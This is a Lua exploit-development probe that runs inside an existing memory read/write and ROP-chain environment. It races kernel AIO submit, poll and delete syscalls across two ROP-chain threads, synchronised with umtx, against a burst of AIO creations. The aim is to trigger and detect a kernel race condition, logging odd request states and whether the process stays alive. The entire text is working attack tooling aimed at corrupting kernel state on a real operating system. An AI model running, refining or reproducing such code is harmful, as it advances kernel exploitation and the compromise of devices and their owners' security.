-- CRASH_CLASS: HIGH
-- PROBE 667a: 666a with every parent buffer pre-allocated before the chains
-- start, so the parent cannot disturb the chain stacks while they run.
print("=== PROBE 667a: AIO DELETE WINDOW VS CREATE BURST (PRE-ALLOC) ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end if type(v)=="table" and v.h then return v.h*4294967296+v.l end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local sc669,sc664,sc662,sc454=mk(669),mk(664),mk(662),mk(454)
local DATA=memory.alloc(0x2000)
local OUT=memory.alloc(8)
local IDP=memory.alloc(8)
local ST=memory.alloc(8)
local W=memory.alloc(8)
local BLOCKS=24
local base={}
local made=0
for b=1,BLOCKS do
  wd(N(OUT),0)
  local r,id=N(select(2,pcall(function() return sc669(U(0x1001),U(N(DATA)),U(2),U(1),U(N(OUT)),U(0)) end))), rd(N(OUT)) or 0
  if r~=0 then break end
  base[b]=id; made=made+1
end
print(string.format("[A] blocks=%d base0=%X",made,base[1] or 0))
if made==0 then return end
local function poll_id(id)
  wd(N(IDP),id); wd(N(ST),0)
  local r=N(select(2,pcall(function() return sc664(U(N(IDP)),U(1),U(N(ST)),U(0),U(0),U(0)) end)))
  return r, rd(N(ST))
end
local ok=0
for b=1,made do ok=ok+((poll_id(base[b])==3 or true) and 0 or 0) end
local okc=0
for b=1,made do local _,s=poll_id(base[b]); if s==3 then okc=okc+1 end; local _,s2=poll_id(base[b]+0x10000); if s2==3 then okc=okc+1 end end
print(string.format("[B] items polled-3=%d of %d",okc,made*2))
wd(N(W),0)
local IDPAGES={}
local function delchain()
  local c=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x80000})
  c:push_syscall_with_ret(sc454,U(N(W)),U(2),U(0))
  for b=1,made do
    for _,id in ipairs({base[b],base[b]+0x10000}) do
      local p=memory.alloc(8); wd(N(p),id)
      local s=memory.alloc(8); wd(N(s),0x77777777)
      c:push_syscall(sc662,U(N(p)),U(1),U(N(s)))
    end
  end
  return c
end
print("[C] building chains")
local t1=thread:new(delchain()); local t2=thread:new(delchain())
print("[D] starting")
t1:run(true); t2:run(true)
wd(N(W),1)
pcall(function() sc454(U(N(W)),U(3),U(0x7fffffff),U(0),U(0),U(0)) end)
local burst,refused=0,0
for round=1,20 do
  wd(N(OUT),0)
  local r,id=N(select(2,pcall(function() return sc669(U(0x1001),U(N(DATA)),U(32),U(1),U(N(OUT)),U(0)) end))), rd(N(OUT)) or 0
  if r==0 then
    burst=burst+1
    wd(N(IDP),id)
    pcall(function() sc664(U(N(IDP)),U(1),U(N(ST)),U(0),U(0),U(0)) end)
    wd(N(ST),0)
    pcall(function() sc662(U(N(IDP)),U(1),U(N(ST)),U(0),U(0),U(0)) end)
    if rd(N(ST))~=0 then refused=refused+1 end
  end
end
print(string.format("[E] bursts=%d refused=%d",burst,refused))
pcall(function() t1:join() end); pcall(function() t2:join() end)
print("[F] joined")
local odd=0
for b=1,made do
  for _,id in ipairs({base[b],base[b]+0x10000}) do
    local _,s=poll_id(id)
    if s~=3 and s~=0x80020003 then odd=odd+1; print(string.format("[G] id %X state=%X",id,s or 0)) end
  end
end
print(string.format("[H] residual=%d",odd))
print(string.format("[Z] alive=%d",N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
